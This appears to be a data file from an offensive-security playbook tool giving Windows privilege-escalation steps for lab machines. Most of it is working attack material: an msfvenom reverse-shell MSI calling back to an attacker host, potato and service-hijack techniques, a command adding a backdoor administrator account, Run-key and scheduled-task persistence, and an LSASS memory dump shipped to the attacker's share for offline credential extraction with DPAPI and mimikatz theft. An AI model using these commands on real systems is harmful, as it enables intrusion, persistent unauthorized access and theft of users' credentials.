actions.title: Local Enumeration Sweep
actions.hypothesis: Same doctrine as Linux: breadth from a scanner (winpeas), judgment from you. The lab classics are service misconfigurations, stored credentials, unquoted paths, and token privileges. Run the scanner, then verify the specific lead manually before staging anything.
actions.proves: establishes local privilege escalation leads, host kernel/version, host architecture
actions.does_not_prove: local privilege escalation lead only — not admin/root/SYSTEM until separately proven

commands.note: Serve from your box. cmd variant; use iwr in PowerShell sessions.
Identity, patches (for kernel-CVE triage), and who already holds admin.
Stored creds and autologon — free passwords more often than you would think.

actions.title: SeImpersonatePrivilege (Potato Family)
actions.hypothesis: Service accounts (IIS, MSSQL) almost always hold SeImpersonatePrivilege, which lets them capture a SYSTEM authentication and impersonate it — the entire potato family (GodPotato on modern Windows, PrintSpoofer, JuicyPotato on older). Prerequisite check first: SeImpersonate present, .NET version adequate, x64, writable staging directory.
actions.does_not_prove: SYSTEM only when command output proves it; a privilege or service lead alone is not SYSTEM

commands.note: Confirm SeImpersonatePrivilege before anything else.
Stage the binary you chose (served from your box). GodPotato covers Win10/11/Server 2012+; older targets want JuicyPotato.
Prove SYSTEM first with a benign write, read it back, then run your real payload/reverse command.

actions.title: Unquoted Service Path
actions.hypothesis: A service binary path with spaces and no quotes (C:\Program Files\My App\svc.exe) makes Windows try C:\Program.exe, then C:\Program Files\My.exe, in order. If any directory in the chain is writable by you, drop an executable with the right name and restart the service (or wait for reboot).
actions.does_not_prove: SYSTEM only when command output proves it; a privilege or service lead alone is not SYSTEM

commands.run: wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "c:\windows\\" | findstr /i /v '"'
commands.note: Find auto-start services with unquoted paths outside C:\Windows.
Verify you can write into the vulnerable directory before staging anything.

actions.title: Weak Service Permissions / Binary Replacement
actions.hypothesis: If you can modify a service configuration (SERVICE_CHANGE_CONFIG) or write to the binary it runs, you control what runs as SYSTEM on next start. accesschk finds them; then point binpath at your command or replace the binary.
actions.does_not_prove: SYSTEM only when command output proves it; a privilege or service lead alone is not SYSTEM

commands.note: Services your account can reconfigure.
Point the service at a benign-but-decisive command, then: sc stop/start (or wait for reboot if you lack stop rights).
Alternate: if the binary itself is writable, back it up and replace it with your payload.

actions.title: AlwaysInstallElevated
actions.hypothesis: If both HKLM and HKCU AlwaysInstallElevated are set to 1, any MSI you run installs as SYSTEM. Generate an MSI that adds an admin user or runs a command, install it, done.
actions.does_not_prove: SYSTEM only when command output proves it; a privilege or service lead alone is not SYSTEM

commands.run: reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated && reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
commands.note: BOTH must be 1. One without the other is nothing.

commands.run: msfvenom -p windows/x64/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f msi -o setup.msi
commands.note: Generate locally (the mentor can build this for you), upload, run: msiexec /i setup.msi /quiet

actions.title: DPAPI Credential Decryption
actions.hypothesis: Windows stores saved credentials (RDP, scheduled tasks, browsers) encrypted with DPAPI masterkeys, which are themselves wrapped with the user's password hash. On boxes where you have a user's password (or are SYSTEM), the entire credential store decrypts — a reliable path to lateral credentials in the 0xdf corpus.
actions.proves: establishes a plaintext password, candidate credentials
actions.does_not_prove: credential material only — not access until it authenticates against a service

commands.note: Find credential blobs and their masterkey GUIDs. Each blob names its masterkey in the file contents.
Unwrap the masterkey using the user's password. mimikatz dpapi::masterkey is the on-box equivalent.
Decrypt the blob with the unwrapped key. RDP creds, VPN creds, service passwords all surface here.
On-box variant when you are running as that user or SYSTEM.

actions.title: Stored Credential Hunting (Windows)
actions.hypothesis: Windows is a credential hoard: Credential Manager (cmdkey), autologon registry keys, unattend/sysprep answer files, saved RDP files, browser stores, and remote-connection managers (mRemoteNG config with decryptable passwords) all leak reusable creds. On lab boxes this sweep is short, scripted, and pays out constantly.
actions.proves: establishes candidate credentials, a plaintext password, stored Windows credential lead
actions.does_not_prove: local privilege escalation lead only — not admin/root/SYSTEM until separately proven

commands.note: Saved credentials. If one exists: runas /savecred /user:{{user}} cmd.exe to use it without knowing the password.
Autologon: DefaultUserName / DefaultPassword in cleartext.
Answer files from imaging — local admin passwords in cleartext. Also check C:\Windows\Panther\Unattend.xml.
mRemoteNG configs hold encrypted-but-decryptable passwords (static key); .rdp files point at targets and usernames.
Browser stores: DPAPI-protected — decrypt via SharpChrome or by copying Login Data + the Local State key offline.

actions.title: Missing-Patch Exploit Suggestions (wesng)
actions.hypothesis: Old Windows boxes (especially HTB-era 2008/2012/7) are often privesc'd by a missing patch, not a misconfiguration. systeminfo output feeds Windows Exploit Suggester / wesng, which maps missing hotfixes to public exploits (MS16-032, MS15-051, Chimichurri...). This is the arctic/grandpa pattern: enumerate patches, match, exploit.
actions.proves: establishes a candidate exploit, missing-patch privesc lead
actions.does_not_prove: local privilege escalation lead only — not admin/root/SYSTEM until separately proven

report.finding: Missing Security Patches with Public Exploits

commands.note: On the target. Save the full output locally: systeminfo > sysinfo.txt then transfer it back.
On your box (pip install wesng; it auto-updates its database). Lists missing KBs mapped to public exploits, ranked.

commands.run: python3 windows-exploit-suggester.py --update && python3 windows-exploit-suggester.py --database mssb.xls --systeminfo sysinfo.txt
commands.note: The classic alternative (corpus arctic). Older but battle-tested on 2008-era boxes.

actions.title: Windows Persistence (Post-Admin)
actions.hypothesis: After admin/SYSTEM, leave a way back: a local admin user you control, a scheduled task, or a Run key. Labs rarely require it, but long engagements do — and it is a report-worthy finding about detection gaps. Document and remove everything you plant.
actions.does_not_prove: persistence setup context — document and clean up; not a new privilege level

commands.run: net user obol_supp 'Str0ng!Passw0rd' /add && net localgroup administrators obol_supp /add
commands.note: Classic local-admin backdoor. Obvious in any user audit — fine for labs, loud in real environments.
Scheduled task running your binary as SYSTEM daily.
Run key — fires at next logon.

actions.title: On-Box LSASS Memory Dump
actions.hypothesis: LSASS holds the credentials of every logged-on user in memory. As admin/SYSTEM you can dump its process with built-in comsvcs.dll (no tools uploaded) or procdump, exfiltrate the .dmp, and parse it offline with pypykatz — plaintext passwords, NT hashes, and Kerberos tickets of anyone logged in. This is the reliable complement to remote secrets dumping when you only have a shell on the box.
actions.proves: establishes a plaintext password, NTLM hashes, Kerberos tickets
actions.does_not_prove: credential material only — not access until it authenticates against a service

commands.note: Get the LSASS PID first — comsvcs MiniDump needs it. tasklist /svc also shows it.

Built-in LOLBin dump — replace 672 with the actual PID, run from an elevated prompt. Nothing uploaded; comsvcs.dll MiniDump is a documented Windows feature. (Defender watches this exact string on modern boxes; procdump is the fallback.)
Sysinternals alternative when comsvcs is blocked. Serve procdump from your box (see file-transfer).
On YOUR box: receive the dump. From the target: move C:\Windows\Temp\lsass.dmp \\{{lhost}}\CompData

Parse offline on your box. Logonpasswords, NT hashes, and Kerberos tickets for every session captured — spray nothing, reuse everything. mimikatz sekurlsa::minidump + sekurlsa::logonpasswords is the Windows-parse variant.
